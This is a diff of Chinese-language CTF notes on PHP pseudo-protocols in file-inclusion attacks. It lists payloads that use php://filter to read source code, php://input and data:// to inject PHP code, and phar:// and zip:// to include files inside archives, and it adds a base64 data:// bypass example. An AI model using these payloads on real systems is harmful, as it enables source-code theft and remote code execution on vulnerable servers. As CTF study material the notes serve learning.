@@ -3,7 +3,7 @@ allow_url_fopen=on默认开启，一般不用管
 <https://blog.csdn.net/weixin_44508748/article/details/108162951>
 
 ^
-php伪协议 文件包含读本地php文件源代码
+## **php伪协议 文件包含读本地php文件源代码**
 ```
 include php://filter/read=convert.base64-encode/resource=flag.php
 
@@ -18,7 +18,7 @@ php://filter/read=convert.base64-encode/index/resource=flag
 ```
 
 ^
-php伪协议 文件包含注入php的php代码
+## **php伪协议 文件包含注入php的php代码**
 ```
 1. 自动包含POST请求体:(需要第一allow_url_include开启)
 include php://input
@@ -32,11 +32,14 @@ include data://text/plain,<?php phpinfo(); ?>
 
 file_get_contents('data://text/plain,welcome to the zjctf','r')
 即为welcome to the zjctf
+
+file_get_contents($_GET['2333']) === 'todat is a happy day'
+则?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=
 ```
 
 
 ^
-php伪协议 文件包含自动解压文件再包含
+## **php伪协议 文件包含自动解压文件再包含**
 ```
 phar://D:/phpinfo.zip/phpinfo.txt
 zip://D:\\phpinfo.jpg%23phpinfo.txt
